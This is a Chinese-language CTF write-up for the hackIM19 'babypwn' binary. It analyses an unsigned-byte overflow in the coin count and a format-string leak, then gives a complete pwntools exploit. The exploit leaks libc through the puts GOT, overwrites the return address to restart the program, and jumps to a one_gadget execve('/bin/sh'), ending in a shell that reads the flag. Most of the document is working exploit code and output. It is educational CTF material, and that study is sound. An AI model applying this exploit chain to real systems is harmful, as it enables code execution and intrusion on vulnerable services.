# 考察点
- 无符号数溢出
- 格式化字符串泄露 libc
  

# 分析
题目还给了 libc 文件
```shell
➜  hackIM19_babypwn file babypwn 
babypwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0962274293f7bca113fc5f453f1e44a83439f5be, not stripped
➜  hackIM19_babypwn checksec babypwn 
Error: No option selected. Please select an option.

➜  hackIM19_babypwn checksec --file=babypwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols            FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   75 Symbols No      0               1               babypwn
```

```shell
➜  hackIM19_babypwn ./babypwn
Create a tressure box?
y
name: cvjark
How many coins do you have?
2
1
2
Tressure Box: cvjark created!
➜  hackIM19_babypwn ./babypwn
Create a tressure box?
y
name: AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%X
How many coins do you have?
2
1
3
Tressure Box: AAAAAAAA.1.f5175790.10.0.0.1.d2a010.1.d5300e60.F53A0168 created!  # 存在格式化字符串漏洞
```



对比 IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  unsigned __int8 coinNum; // [rsp+6h] [rbp-6Ah] BYREF
  unsigned __int8 i; // [rsp+7h] [rbp-69h]
  char *format; // [rsp+8h] [rbp-68h]
  _DWORD stackSpace[20]; // [rsp+10h] [rbp-60h] BYREF     format 字符串和 stackSpace 很相近，一个使格式化字符串，一个是可以写入的地方。
  char v8[8]; // [rsp+60h] [rbp-10h] BYREF
  unsigned __int64 v9; // [rsp+68h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  coinNum = 0;
  puts("Create a tressure box?\r");
  _isoc99_scanf("%2s", v8);
  if ( v8[0] == 'y' || v8[0] == 89 )
  {
    printf("name: ");
    format = (char *)malloc(0x64uLL);           // format 在堆上，大小0x64
    strcpy(format, "Tressure Box: ");
    _isoc99_scanf("%50s", format + 14);         // 输入到 format
    strcat(format, " created!\r\n");
    puts("How many coins do you have?\r");
    _isoc99_scanf("%hhu", &coinNum);            // coinNum 的本意应当是为 %d，但这里使用了 %hhu 接收
    if ( (char)coinNum > 20 )
    {
      perror("Coins that many are not supported :/\r\n");
      exit(1);
    }
    for ( i = 0; i < coinNum; ++i )
      _isoc99_scanf("%d", &stackSpace[i]);      // 写入数据 [rbp-60h]，距离返回地址 rbp+8 有 68 单位
    printf(format);                             // printf 输出可控字符
    free(format);
    result = 0;
  }
  else
  {
    puts("Bye!\r");
    result = 0;
  }
  return result;
}
```

IDA 大致分析之后，进一步做尝试
```SHELL
➜  hackIM19_babypwn ./babypwn
Create a tressure box?
y
name: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
How many coins do you have?
1
43690                  
Tressure Box: 1.9f101790.10.0.0.1.bcd010.aaaa.9aaadc00.9f32c168.f0 created!
```
scanf 进行提交的 43690(十六进制是：aaaa)，被输入的格式化字符串进行输出了，并且 offset = 8

```shell
➜  hackIM19_babypwn ./babypwn
Create a tressure box?
y
name: .%8$x.
How many coins do you have?
1
48879
Tressure Box: .beef. created!
```

正常进行输入的话是不会有太大危害，但对于coinsNum 的接收
`_isoc99_scanf("%hhu", &coinNum);` 使用了一个字节无符号数去接受 `coinNum`，传入 `-1` 实际写入 `0xff`，

突破后续的判断`if ( (char)coinNum > 20 )`从而利用后续的循环`for ( i = 0; i < coinNum; ++i )`往栈上填充数据`_isoc99_scanf("%d", &stackSpace[i]);` 造成边界突破。

# payload 分析
IDA 分析写入目标数组`stackSpace`相对 rbp 为 60h 的单位内容【这里的单位是 4bytes，因为写入使用格式化 %d 进行了控制】，意味着 68h padding 开始就可以覆盖到返回地址，至于 cannary 由于是 scanf 进行 %d 的接收，传入字符"+" 不会修改内容。
本例开启了 NX、Full RELRO，给了 libc， **思路在于利用格式化字符串泄露出 libc，随后尝试 one_gadget 覆盖返回地址**。

达到上述目标需要二次触发相应的漏洞：
1. 第一次触发：利用格式化字符串，传入 puts GOT 地址，泄露出 puts 的地址，进而计算 libc 载入基址，覆盖返回地址为程序起始地址`_start`，使游戏再一次进行
2. 第二次触发：利用泄露出来的 libc 基址，计算 gadget 地址，再次对返回地址进行覆盖。
ps: 程序使 64位的，scanf 的回写单位 使 4bytes，因此传入对传入的地址8字节需要分两次进行。


one_gadget

```shell
# 挨个尝试，我的机器上第三个可以 pop shell
➜  hackIM19_babypwn one_gadget ./libc 
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```



# exp
```python
# -*- coding: UTF-8 -*-

from pwn import *
context.log_level = "debug"
pipe = process("./babypwn", env = {'LD_PRELOAD':'./libc'})  
libc = ELF("./libc")


def gameStart(name, coin):
    print(pipe.recvline("Create a tressure box?"))
    pipe.sendline('y')
    print(pipe.recvuntil("name: "))
    pipe.sendline(name)
    print(pipe.recvline())
    pipe.sendline(str(coin))

gameStart(".%8$s.", -1)

# 进入 scanf 环节，每次写入 4bytes 因为 scanf 用的 %d，每个地址占8字节，高位用0填充
# putGOT = 0x00600fb0 = 6295472     mallocGOT = 0x00600fe0 = 6295520
pipe.sendline('6295472')    # 设置
pipe.sendline('0')


pipe.sendline('6295520')
pipe.sendline('0')

# scanf 写回的地址起始为 rbp-60h，因此 rbp-68h 是返回地址，前面填充两个地址，68h - 10h = 58h 58h/4 = 22 单位的4字节
for i in range(22): 
    pipe.sendline('+')  # 使用加号不会修改内容

# _start = 0x00400710 = 4196112, 覆盖返回地址为 _start 回到程序最开始位置，restart game
pipe.sendline('4196112')
pipe.sendline('0')

# 填充剩余的 scanf 内容，因为输入 -1 = ff， ffh * 4 - 70h = 908、4 = 227 
for i in range(227):    
    pipe.sendline('+')

leakInfo = pipe.recvline()
# pipe.recvline()
value = leakInfo.split(".")[1]
putGOT = u64(value + "\x00"*(8-len(value)))
print("puts function GOT: 0x%x" % putGOT)

libcBase = putGOT - libc.symbols['puts']
print("libc Base address: 0x%x" % libcBase)
one_gadGet = libcBase + 0xf1147
print("One_gadget address: 0x%x" % one_gadGet)

# 第一次 game 通过控制 -1 传入，使得可以覆盖返回地址，为了维持工作，设置返回地址为程序的初始位置 `_start`，开始新一轮的game，这次覆盖成 one_gadget
gameStart("57005", -1)

for i in range(26):
    pipe.sendline("+")

pipe.sendline(str((one_gadGet & 0xffffffff)))
pipe.sendline(str(one_gadGet >> 32))

for i in range(227):
    pipe.sendline("+")

pipe.interactive()

```

```shell
[*] Switching to interactive mode
Tressure Box: 57005 created!
$ ls
README.md  babypwn  core  exp.py  flag  libc  peda-session-babypwn.txt  test.c
$ cat flag
flag{DEADBEEF}
```
